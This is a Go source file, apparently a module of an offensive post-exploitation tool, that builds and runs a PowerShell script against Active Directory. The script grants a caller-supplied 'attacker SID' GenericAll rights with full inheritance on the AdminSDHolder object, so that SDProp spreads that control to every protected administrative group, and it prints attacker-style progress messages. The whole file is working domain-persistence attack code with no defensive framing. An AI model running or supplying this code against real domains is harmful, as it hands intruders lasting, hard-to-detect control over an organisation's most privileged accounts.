//go:build windows
// +build windows

package main

import (
	"fmt"
)

func modifyAdminSDHolder(attackerSID string) error {
	if attackerSID == "" {
		return fmt.Errorf("usage: modifyAdminSDHolder(attackerSID)")
	}

	psCmd := fmt.Sprintf(`
$sid = "%s"

try {
	$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
	$adminsdDN = "CN=AdminSDHolder,CN=System,$domainDN"
	$obj = [ADSI]"LDAP://$adminsdDN"

	$acl = $obj.psbase.ObjectSecurity

	$identity = [System.Security.Principal.SecurityIdentifier]$sid
	$rights = [DirectoryServices.ActiveDirectoryRights]::GenericAll
	$type = [System.Security.AccessControl.AccessControlType]::Allow
	$inheritance = [DirectoryServices.ActiveDirectorySecurityInheritance]::All

	$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
		$identity, $rights, $type, $inheritance
	)

	$acl.AddAccessRule($ace)
	$obj.psbase.CommitChanges()

	Write-Output "[+] ACE added to AdminSDHolder for SID: $sid"
	Write-Output "[*] Grant: GenericAll / Inheritance: All"
	Write-Output "[*] SDProp will propagate in ~60 minutes"
	Write-Output "[*] All protected groups will gain this ACE"

	$currentAcl = $obj.psbase.ObjectSecurity
	$currentAcl.Access | ForEach-Object {
		Write-Output "  ACE: $($_.IdentityReference) -> $($_.ActiveDirectoryRights)"
	}
} catch {
	Write-Error "AdminSDHolder modification failed: $_"
}
`, attackerSID)

	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return fmt.Errorf("AdminSDHolder modification failed: %w\nOutput: %s", err, out)
	}
	_ = out
	return nil
}
